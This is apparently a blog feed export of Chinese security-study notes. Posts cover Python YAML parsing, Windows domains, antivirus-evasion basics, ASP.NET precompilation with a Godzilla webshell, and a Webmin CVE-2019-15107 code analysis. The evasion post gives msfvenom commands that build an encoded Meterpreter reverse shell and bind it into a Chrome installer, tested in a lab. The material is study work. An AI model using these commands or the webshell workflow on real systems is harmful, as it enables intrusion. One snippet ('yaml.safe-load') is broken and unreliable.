<p><img src="/2024/03/31/python%E5%8A%A0%E8%BD%BDyml%E5%AE%9E%E7%8E%B0%E7%89%B9%E5%AE%9A%E5%8A%9F%E8%83%BD/%7B895397D6-80CD-4a2e-AB23-78897C6ED8BC%7D.png" alt="样例二"></p>
<p>那如果是yml中的字典和列表呢？其实可以指定其参数进行获取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">file_yml = <span class="string">&quot;./exmple.yaml&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_yml,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    data = yaml.load(fp, Loader=yaml.FullLoader)</span><br><span class="line"><span class="comment"># 获取字典中的特定值</span></span><br><span class="line">desired_value = data.get(<span class="string">&#x27;param_dict&#x27;</span>).get(<span class="string">&#x27;key2&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取列表中的特定值</span></span><br><span class="line">desired_value = data.get(<span class="string">&#x27;param_list&#x27;</span>)[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>我们可以通过keys关键字获取所有键的列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解析yaml文件</span></span><br><span class="line">data = yaml.safe-load(data)</span><br><span class="line"><span class="comment"># 获取所有键</span></span><br><span class="line">desired_value = data[<span class="string">&#x27;param_dict&#x27;</span>].keys()</span><br><span class="line"><span class="comment">#获取键的数量</span></span><br><span class="line">num_keys = <span class="built_in">len</span>(desired_value)</span><br><span class="line"><span class="comment">#遍历键的列表</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> desired_value:</span><br><span class="line">    value = data[<span class="string">&#x27;param_dict&#x27;</span>][key]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;键: <span class="subst">&#123;key&#125;</span>,值: <span class="subst">&#123;value&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全，python</tag>
      </tags>
  </entry>
  <entry>
    <title>windows域与用户组策略笔记(废弃)</title>
    <url>/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<hr>
<hr>
<p>以前学习时，遇到过在windows7旗舰版非administer和administer账户下的执行或搭建一些web服务会遇到可执行函数无法执行（反馈回来的是得不到回显）。</p>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>当一个工作组中的计算机变多时，域（Domain）便成了一个更好的计算机资源管理模式，在于环境中所有的用户，用户组，计算机，打印机等设备都在一个或多个域控制器的中央数据库中注册，当域用户需要访问域中的资源时，必须通过域控制器集中进行身份验证。</p>
<p>域可以分为单域，父域和子域，域树，域林等多种。</p>
<h4 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h4><p>活动目录（ Active Directory , AD ）是指安装在域控制器上，为整个域环境提供集中式目录管理服务的组件。活动目录存储了有关域环境中各种对象的信息，如域、用户、用户组、计算机、组织单位、共享资源、安全策略等，目录数据存储在域控制器的 Ntds.dit 文件中，活动目录主要提供了以下功能：</p>
<ul>
<li>计算机集中管理：集中管理所有加入域的服务器及客户端计算机，统一下发组策略。</li>
<li>用户集中管理：集中管理城用户、组织通讯录、用户组，对用户进行统一的身份认证、资源授权等。</li>
<li>资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。</li>
<li>环境集中配置：集中的配置城中计算机的工作环境，如统一计算机桌面、统一网络连接配置，统一计算机安全配置等。</li>
<li>应用集中管理：对城中的计算机统一推送软件、安全补丁、防病毒系统等。</li>
</ul>
<h4 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h4><p>该文件是一个二进制文件，保存在域环境的域控制系统上，是主要的活动目录数据库，该文件包含有关域用户的，用户密码的哈希散列值，用户组，组成员身份和组策略信息，是使用SYSTEM文件中的密钥对这些hash值进行加密。存储位置为域控的(一般情况或绝大情况下) <code>%SystemRoot%\ntds.dit</code></p>
<p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。而在<strong>非域环境下，用户的登录凭据等信息储存在本地的SAM文件下</strong>。</p>
<p>​																																							有关域的内容等学会更多再更新。</p>
<h3 id="用户组策略"><a href="#用户组策略" class="headerlink" title="用户组策略"></a>用户组策略</h3><hr>
<p>前置：对于文章开篇问题，简单解决方案：启动administer用户并设置密码，禁用或删除其他管理员账户以解决权限问题（当然对于部分系统内置文件其最高权限也是无法需改，可以进PE启动盘删改（大概</p>
<p><img src="/2023/12/21/windows%E5%9F%9F%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5/%7B90E274FD-8600-4a95-B846-86E1992A6849%7D.png" alt="原环境为PVE,现环境为VM"></p>
<hr>
<h4 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h4><p>访问令牌(Access Tokens)是Windows操作系统安全性的一个概念。当用户登陆时，系统创建一个访问令牌，里面包含登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表。此后代表该用户执行的每个进程都有此访问令牌的副本，每当线程或进程与安全对象交互或尝试执行需要特权的系统任务时，windows都会使用此令牌标识并确定关联账户。SID用来标识用户账户和该用户所属的组。（关联知识：DACL和SACL）</p>
<h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><blockquote>
<p>组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上管理组策略对象。</p>
<p>​                                                                                                                 														   –百度百科</p>
</blockquote>
<h3 id="影子账户设立"><a href="#影子账户设立" class="headerlink" title="影子账户设立"></a>影子账户设立</h3><p>之前想单独了解用户组和sam文件，但后来和组策略搞混了，只能以后学习了。。。</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀基础了解笔记</title>
    <url>/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<hr>
<p> 免杀基础笔记</p>
<hr>
<h3 id="免杀基础概念"><a href="#免杀基础概念" class="headerlink" title="免杀基础概念"></a>免杀基础概念</h3><p>免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。</p>
<p>免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。</p>
<p>免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以自己编写免杀脚本。</p>
<h3 id="杀毒软件检测方式"><a href="#杀毒软件检测方式" class="headerlink" title="杀毒软件检测方式"></a>杀毒软件检测方式</h3><h4 id="静态查杀"><a href="#静态查杀" class="headerlink" title="静态查杀"></a>静态查杀</h4><p>一般根据特征码识别，对文件进行特征码匹配。将扫描信息与病毒数据库进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
<h4 id="云查杀"><a href="#云查杀" class="headerlink" title="云查杀"></a>云查杀</h4><p>查杀原理是对文件内容和行为的检测</p>
<h4 id="行为查杀-动态查杀"><a href="#行为查杀-动态查杀" class="headerlink" title="行为查杀&#x2F;动态查杀"></a>行为查杀&#x2F;动态查杀</h4><p>对目标产生的行为进行检测，即对即将执行的指令进行检测</p>
<h4 id="扫描查杀方式"><a href="#扫描查杀方式" class="headerlink" title="扫描查杀方式"></a>扫描查杀方式</h4><ul>
<li><p>1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。</p>
</li>
<li><p>2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。</p>
</li>
<li><p>3、修复技术：即是对恶意程序所损坏的文件进行还原</p>
</li>
<li><p>4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。</p>
</li>
<li><p>5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。</p>
</li>
<li><p>6、全盘扫描：扫描电脑全部磁盘，耗时较长。</p>
</li>
<li><p>7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。</p>
</li>
<li><p>8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序</p>
<h4 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h4></li>
<li><p>内存监控：当内存中注入病毒时，进行删除等操作</p>
</li>
<li><p>文件监控：当文件被越权改动，或写入磁盘时存在病毒时进行查杀</p>
</li>
<li><p>网页保护：阻止非法网站的窃取和非法文件下载</p>
<p><strong>其他的还有主动防御技术，机器学习识别技术(人工智能识别技术)，进程行为检测法()沙盒模式，文件校验法等等</strong></p>
<h3 id="基础免杀于msfvenom工具"><a href="#基础免杀于msfvenom工具" class="headerlink" title="基础免杀于msfvenom工具"></a>基础免杀于msfvenom工具</h3><p>简单免杀多是改变进程名称，图标，文件名称，文件属性，加壳，对木马进行编码，修改源码的特征码，对shellcode进行二次编译，使用免杀生成器，加载器等。</p>
</li>
</ul>
<p>msFvenom是msfpayload和msfencode的组合，msFvenom目前已经无法单独使用绕过免杀。</p>
<ul>
<li><p>-p 指定使用的payload</p>
</li>
<li><p>-l 列出指定模块的可用资源：payloads encodes nops all</p>
</li>
<li><p>-n 为payload预定一个NOP的滑动长度</p>
</li>
<li><p>-f 指定输出格式</p>
</li>
<li><p>-e 指定需要的编码格式</p>
</li>
<li><p>-a 指定payload的目标架构 x86|x64|x86_64</p>
</li>
<li><p>-platform 指定目标平台</p>
</li>
<li><p>-s 设置文件大小</p>
</li>
<li><p>-i 设置编码次数</p>
</li>
<li><p>-o 指定payload存放位置</p>
<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4></li>
</ul>
<p>kali下执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.56.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>  该命令是指制作一个windows x86架构的反向shell，其中设置监听主机为ip和port，编码格式下为</p>
<p><strong>shikat_ga_nai</strong> (不包含\x00字符即空字符)(此处编码了30次)的名为shell.exe的可执行脚本。</p>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215124624.jpg" alt="木马生成"></p>
<p>放到&#x2F;上传到指定系统双击运行即可。(因为安装的360杀毒很久之前就已经可以检测出来了，就不展示了^<del>__</del>^</p>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215135040.jpg" alt="木马被360拦截"></p>
<p>msfvenom进行捆绑软件木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.65.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -x setchrome.exe -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>图中ip的65写成了56，唉又重新做了一遍，哭。</li>
</ul>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140146.jpg" alt="捆绑安装chrome"></p>
<p>发现360杀毒并未检测出来病毒（360杀毒安装时间为23-12-15日，但过了大约1分钟后被查杀出）（但第二次上传后，未进行扫描，且断开网络后360并未查杀，（个人猜测：感觉是本地库下扫描未检出，但联网后的云检测可以检测出来（个人猜想不一定正确^__^））</p>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140722.jpg"></p>
<p>下一步开始执行安装程序（下载kali开启监听</p>
<p>操作时突然发现一个盲点：kali目前只有一个网卡，windows10有两个，但要互ping就要使用VM8网卡，而这个网卡又连着网络，一连网就查杀。无奈再给kali一个网卡vm2，重新走一遍流程。哭，kali默认的atuo lo就只有一个网卡，还得重新静态路由。！！！</p>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215143025.jpg"></p>
<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215144014.jpg"></p>
<p>重来：</p>
<p>重新生成-&gt;window10禁止上网-&gt;打开360-&gt;木马查杀-&gt;kali msf监听-&gt;双击运行（对，这一切的一切windows10没开windows defender。）</p>
<p>额返回值还是为空？？？</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>渗透测试，免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>关于aspx文件和dll文件的关系的学习</title>
    <url>/2023/12/27/%E5%85%B3%E4%BA%8Easpx%E6%96%87%E4%BB%B6%E5%92%8Cdll%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<hr>
<hr>
<p>在上班时发现一个问题：在畅捷通T+服务当中存在一个任意目录文件上传，但是该应用是整套程序进行了预编译，无法对aspx文件进行解析，因此只能上传与之相关的dll和compiled文件</p>
<hr>
<h3 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h3><p>ASP.NET 是一个免费的 Web 框架，用于使用 HTML、CSS 和 JavaScript 构建出色的网站和 Web 应用程序。 还可以创建 Web API 并使用实时技术，例如 Web 套接字。ASP.NET可以运行在安装了.NET Framework的<a href="https://zh.wikipedia.org/wiki/Internet_Information_Server">IIS</a>服务器上。</p>
<p>ASP 和 ASPX 的区别在于 ASP 运行在 IIS 上，而 ASPX 运行在 .NET 框架上。  他们使用不同的编码语言。 ASP 使用 VBscript 作为其编码语言，而 ASPX 使用 C# 和 VB.NET 作为其编码语言。 因此ASPX文件可以执行c#中的系统命令函数。</p>
<h4 id="ASPX文件的预编译"><a href="#ASPX文件的预编译" class="headerlink" title="ASPX文件的预编译"></a>ASPX文件的预编译</h4><p>相较于动态编译，预编译的速度更快，同时可以防止源代码被查看。在网站部署时使用aspx文件进行编译，转换成dll文件，放到指定位置，.NET程序便会在运行时会优先加载bin目录下的程序集 即<code>index.aspx -&gt; /bin/index.dll</code> 也就是说在访问index.aspx时，程序会去寻找&#x2F;bin目录下的index.dll文件加载网页(即使访问的目录下没有index.aspx文件)。</p>
<h3 id="哥斯拉生成CShapDynamicPayload-net2-0及以上"><a href="#哥斯拉生成CShapDynamicPayload-net2-0及以上" class="headerlink" title="哥斯拉生成CShapDynamicPayload (.net2.0及以上)"></a>哥斯拉生成CShapDynamicPayload (.net2.0及以上)</h3><p>使用哥斯拉生成aspx文件，文件生成后放到一个单独的文件，方便接下来复现</p>
<img src="/2023/12/27/%E5%85%B3%E4%BA%8Easpx%E6%96%87%E4%BB%B6%E5%92%8Cdll%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/12/27/%E5%85%B3%E4%BA%8Easpx%E6%96%87%E4%BB%B6%E5%92%8Cdll%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/%7B0201F1AA-18C7-4562-AE12-7E5AE44796BD%7D-17037585455591.png" class title="哥斯拉生成木马">

<h3 id="aspnet-compiled程序"><a href="#aspnet-compiled程序" class="headerlink" title="aspnet_compiled程序"></a>aspnet_compiled程序</h3><h3 id="dll与compiled"><a href="#dll与compiled" class="headerlink" title="dll与compiled"></a>dll与compiled</h3><p>—————-待更新—————待更新——————–待更新———————–待更新—————–待更新————待更新————</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>ASP.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>关于webmin-CVE-2019-15107的注入点代码分析</title>
    <url>/2023/09/20/%E5%85%B3%E4%BA%8Ewebmin-CVE-2019-15107%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>浏览了多篇webmin的CVE-2019-15107后发现，有许多错误的playload或者存在不同版本对应的playload不通用。因此想要了解一下指定版本下的注入点的成因。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。目前Webmin支持绝大多数的Unix系统，这些系统除了各种版本的linux以外还包括：AIX、HPUX、Solaris、Unixware、Irix和FreeBSD等。</p>
<p>在19年，Pentest上发布了CVE-2019-15107未授权远程代码执行漏洞。写到当用户在webmin(1.890~1.920)版本上开启Webmin密码重置【使用过期的密码提示用户输入新密码】功能后，攻击者可以通过向password_change.cgi功能页面发送特定的POST请求在目标系统中执行任意命令，并且无需身份验证即未授权RCE。而在其中，POST请求需要填写多种参数，而参数之间又有一些特定相关性，因此要通过代码审计才能搞清楚。</p>
<h1 id="环境配置事项"><a href="#环境配置事项" class="headerlink" title="环境配置事项"></a>环境配置事项</h1><p>在安装webmin建议使用官方的一键部署脚本安装，可以避免不必要的环境依赖问题。<br>安装完成后，切记打开【使用过期的密码提示用户输入新密码】功能。<br>查看miniserv.conf中passwd_mode&#x3D;2是否已成立。2表示【使用过期的密码提示用户输入新密码】已修改成功。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">syslog=1</span><br><span class="line">session=1</span><br><span class="line">premodules=WebminCore</span><br><span class="line">userfile=/etc/webmin/miniserv.users</span><br><span class="line">keyfile=/etc/webmin/miniserv.pem</span><br><span class="line">passwd_file=/etc/shadow</span><br><span class="line">passwd_uindex=0</span><br><span class="line">passwd_pindex=1</span><br><span class="line">passwd_cindex=2</span><br><span class="line">passwd_mindex=4</span><br><span class="line">passwd_mode=2</span><br><span class="line">preroot=gray-theme</span><br><span class="line">passdelay=1</span><br><span class="line">cipher_list_def=1</span><br><span class="line">root=/usr/libexec/webmin</span><br></pre></td></tr></table></figure>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>查看webmin漏洞处的关键源代码源代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/perl</span></span><br><span class="line"><span class="comment"># password_change.cgi</span></span><br><span class="line"><span class="comment"># Actually update a user&#x27;s password by directly modifying /etc/shadow</span></span><br><span class="line"></span><br><span class="line">BEGIN &#123; <span class="title function_ invoke__">push</span>(@INC, <span class="string">&quot;.&quot;</span>); &#125;;</span><br><span class="line"><span class="keyword">use</span> <span class="title">WebminCore</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ENV</span>&#123;<span class="string">&#x27;MINISERV_INTERNAL&#x27;</span>&#125; || <span class="keyword">die</span> <span class="string">&quot;Can only be called by miniserv.pl&quot;</span>;</span><br><span class="line">&amp;<span class="title function_ invoke__">init_config</span>();</span><br><span class="line">&amp;<span class="title function_ invoke__">ReadParse</span>();</span><br><span class="line">&amp;<span class="title function_ invoke__">get_miniserv_config</span>(\%miniserv);</span><br><span class="line"><span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_mode&#x27;</span>&#125; == <span class="number">2</span> || <span class="keyword">die</span> <span class="string">&quot;Password changing is not enabled!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validate inputs</span></span><br><span class="line"><span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125; ne <span class="string">&#x27;&#x27;</span> || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_enew1&#x27;</span>&#125;);</span><br><span class="line"><span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125; eq <span class="variable">$in</span>&#123;<span class="string">&#x27;new2&#x27;</span>&#125; || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_enew2&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Is this a Webmin user?</span></span><br><span class="line"><span class="keyword">if</span> (&amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;acl&quot;</span>)) &#123;</span><br><span class="line">	&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;acl&quot;</span>, <span class="string">&quot;acl-lib.pl&quot;</span>);</span><br><span class="line">	(<span class="variable">$wuser</span>) = grep &#123; <span class="variable">$_</span>-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125; eq <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125; &#125; &amp;acl::<span class="title function_ invoke__">list_users</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; eq <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment"># A Webmin user, but using Unix authentication</span></span><br><span class="line">		<span class="variable">$wuser</span> = undef;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">elsif</span> (<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; eq <span class="string">&#x27;*LK*&#x27;</span> ||</span><br><span class="line">	       <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; =~ /^\!/) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="string">&quot;Webmin users with locked accounts cannot change &quot;</span>.</span><br><span class="line">		       	    <span class="string">&quot;their passwords!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$in</span>&#123;<span class="string">&#x27;pam&#x27;</span>&#125; &amp;&amp; !<span class="variable">$wuser</span>) &#123;</span><br><span class="line">	<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_cindex&#x27;</span>&#125; ne <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_mindex&#x27;</span>&#125; ne <span class="string">&#x27;&#x27;</span> || </span><br><span class="line">		<span class="keyword">die</span> <span class="string">&quot;Missing password file configuration&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$wuser</span>) &#123;</span><br><span class="line">	<span class="comment"># Update Webmin user&#x27;s password</span></span><br><span class="line">	<span class="variable">$enc</span> = &amp;acl::<span class="title function_ invoke__">encrypt_password</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;, <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$enc</span> eq <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;,qx/<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;/);</span><br><span class="line">	<span class="variable">$perr</span> = &amp;acl::<span class="title function_ invoke__">check_password_restrictions</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$perr</span> &amp;&amp; &amp;<span class="title function_ invoke__">pass_error</span>(&amp;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;password_enewpass&#x27;</span>, <span class="variable">$perr</span>));</span><br><span class="line">	<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::<span class="title function_ invoke__">encrypt_password</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>;</span><br><span class="line">	&amp;acl::<span class="title function_ invoke__">modify_user</span>(<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, <span class="variable">$wuser</span>);</span><br><span class="line">	&amp;<span class="title function_ invoke__">reload_miniserv</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="title function_ invoke__">elsif</span> (<span class="variable">$gconfig</span>&#123;<span class="string">&#x27;passwd_cmd&#x27;</span>&#125;) &#123;</span><br><span class="line">	<span class="comment"># Use some configured command</span></span><br><span class="line">	<span class="variable">$passwd_cmd</span> = &amp;<span class="title function_ invoke__">has_command</span>(<span class="variable">$gconfig</span>&#123;<span class="string">&#x27;passwd_cmd&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$passwd_cmd</span> || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="string">&quot;The password change command &lt;tt&gt;<span class="subst">$gconfig</span>&#123;&#x27;passwd_cmd&#x27;&#125;&lt;/tt&gt; was not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;proc-lib.pl&quot;</span>);</span><br><span class="line">	&amp;<span class="title function_ invoke__">clean_environment</span>();</span><br><span class="line">	<span class="variable">$ENV</span>&#123;<span class="string">&#x27;REMOTE_USER&#x27;</span>&#125; = <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;;	<span class="comment"># some programs need this</span></span><br><span class="line">	<span class="variable">$passwd_cmd</span> .= <span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">quotemeta</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;);</span><br><span class="line">	(<span class="variable">$fh</span>, <span class="variable">$fpid</span>) = &amp;proc::<span class="title function_ invoke__">pty_process_exec</span>(<span class="variable">$passwd_cmd</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&amp;<span class="title function_ invoke__">reset_environment</span>();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		local <span class="variable">$rv</span> = &amp;<span class="title function_ invoke__">wait_for</span>(<span class="variable">$fh</span>,</span><br><span class="line">			   <span class="string">&#x27;(new|re-enter).*:&#x27;</span>,</span><br><span class="line">			   <span class="string">&#x27;(old|current|login).*:&#x27;</span>,</span><br><span class="line">			   <span class="string">&#x27;pick a password&#x27;</span>,</span><br><span class="line">			   <span class="string">&#x27;too\s+many\s+failures&#x27;</span>,</span><br><span class="line">			   <span class="string">&#x27;attributes\s+changed\s+on|successfully\s+changed&#x27;</span>,</span><br><span class="line">			   <span class="string">&#x27;pick your passwords&#x27;</span>);</span><br><span class="line">		<span class="variable">$out</span> .= <span class="variable">$wait_for_input</span>;</span><br><span class="line">		<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$rv</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment"># Prompt for the new password</span></span><br><span class="line">			<span class="title function_ invoke__">syswrite</span>(<span class="variable">$fh</span>, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;.<span class="string">&quot;\n&quot;</span>, <span class="title function_ invoke__">length</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;)+<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">elsif</span> (<span class="variable">$rv</span> == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="comment"># Prompt for the old password</span></span><br><span class="line">			<span class="title function_ invoke__">syswrite</span>(<span class="variable">$fh</span>, <span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;.<span class="string">&quot;\n&quot;</span>, <span class="title function_ invoke__">length</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;)+<span 